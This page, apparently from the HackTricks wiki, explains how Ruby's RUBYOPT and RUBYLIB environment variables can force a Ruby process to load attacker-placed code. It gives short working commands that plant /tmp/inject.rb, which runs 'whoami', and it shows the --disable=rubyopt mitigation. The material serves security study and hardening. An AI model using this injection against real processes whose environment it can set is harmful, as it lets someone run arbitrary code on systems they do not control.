---
title: "macOS Ruby Applications Injection"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ruby-applications-injection.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## RUBYOPT

Ruby parses supported command-line switches from the `RUBYOPT` environment variable before running a script. Ruby rejects code execution through `-e` in `RUBYOPT`, but `-I` can prepend a library-search directory and `-r` can require a library. A process that launches Ruby with attacker-controlled environment variables can therefore be made to load attacker-controlled Ruby code.[\[1\]](#references)

Create `/tmp/inject.rb`:

```
puts `whoami`
```
Create a benign Ruby script such as `hello.rb`:

```
puts 'Hello, World!'
```
Run it with a controlled `RUBYOPT` value:

```
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
To disable this behavior, pass `--disable=rubyopt` (or `--disable-rubyopt`) **before** the script name:[\[1\]](#references)

```
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
An option written after `hello.rb` is passed to the script in `ARGV`; it does not disable Ruby’s earlier processing of `RUBYOPT`.[\[1\]](#references)

```
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Instead of prepending the load directory with `-I` inside `RUBYOPT`, the separate `RUBYLIB` environment variable adds directories to Ruby’s `$LOAD_PATH`. Combined with `RUBYOPT=-r<module>` it loads attacker code without needing `-I` in `RUBYOPT`:[\[1\]](#references)

```
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References
